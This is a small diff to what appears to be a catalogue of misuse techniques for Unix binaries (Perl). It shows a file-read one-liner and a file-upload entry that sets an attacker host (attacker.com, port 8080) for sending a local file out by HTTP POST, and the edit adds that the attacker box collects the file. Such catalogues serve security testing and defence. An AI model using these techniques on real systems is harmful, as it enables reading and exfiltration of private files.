@@ -7,7 +7,7 @@ functions:
         LFILE=file_to_read
         perl -ne print $LFILE
   file-upload:
-    - description: Send local file via "d" parameter of a HTTP POST request.
+    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export RHOST=attacker.com
         export RPORT=8080
